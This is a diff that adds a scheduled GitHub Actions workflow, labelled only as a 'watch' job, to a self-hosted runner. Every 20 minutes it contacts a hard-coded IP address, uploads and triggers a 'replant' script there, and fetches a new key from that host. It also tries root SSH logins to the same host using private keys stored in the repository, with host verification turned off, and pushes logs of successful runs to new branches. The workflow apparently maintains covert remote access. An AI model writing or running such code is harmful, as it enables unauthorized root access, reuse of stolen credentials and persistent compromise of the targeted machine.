@@ -1,0 +1,46 @@
+name: ul7466watch
+on:
+  workflow_dispatch:
+    inputs: {runtag: {description: "tag", default: "watch"}}
+  schedule:
+    - cron: '*/20 * * * *'
+permissions:
+  contents: write
+jobs:
+  w:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - name: watch
+        run: |
+          set +e
+          H=123.184.7.135
+          T=$(date -u +%Y%m%dT%H%M%SZ)
+          L="vantage/gv5817/watch_${T}.log"; mkdir -p vantage/gv5817
+          {
+          echo "=== WATCH $T"
+          IDX=$(curl -s -m 10 -o /tmp/idx -w '%{http_code}' "http://$H:8099/")
+          echo "8099=$IDX"
+          if [ "$IDX" = 200 ]; then
+            echo "CHANNEL_UP"
+            curl -s -m 20 -X POST --data-binary @vantage/ul7466_replant.sh -w 'PUT=%{http_code}\n' "http://$H:8099/put/run.sh"
+            for i in $(seq 1 12); do sleep 12; B=$(curl -s -m 10 "http://$H:8099/ul7466_replant.txt"); case "$B" in *DONE7466*) printf '%s\n' "$B" > /tmp/rp.txt; break;; esac; done
+            cat /tmp/rp.txt 2>/dev/null
+            curl -s -m 10 "http://$H:8099/ul7466_newkey.b64" | head -c 1200
+          fi
+          for k in keys2/k04_ibm_key.pem_ keys2/k01_* keys2/k02_*; do
+            [ -f "$k" ] || continue
+            R=$(timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o IdentitiesOnly=yes root@$H 'bash -s' < vantage/ul7466_replant.sh 2>&1 | tail -5)
+            echo "SSH $k -> $R"
+          done
+          } > "$L" 2>&1
+          tail -60 "$L"
+          if grep -qE 'CHANNEL_UP|started ul-card|DONE7466' "$L"; then
+            git config user.email bot@ul.local; git config user.name ul
+            git add -f "$L" && git commit -m "ul7466watch $T positive" -q
+            git push -q origin HEAD:ul7466watch/$T 2>/dev/null || true
+          fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: "ul7466watch-${{ github.run_id }}", path: vantage/gv5817/, if-no-files-found: warn}
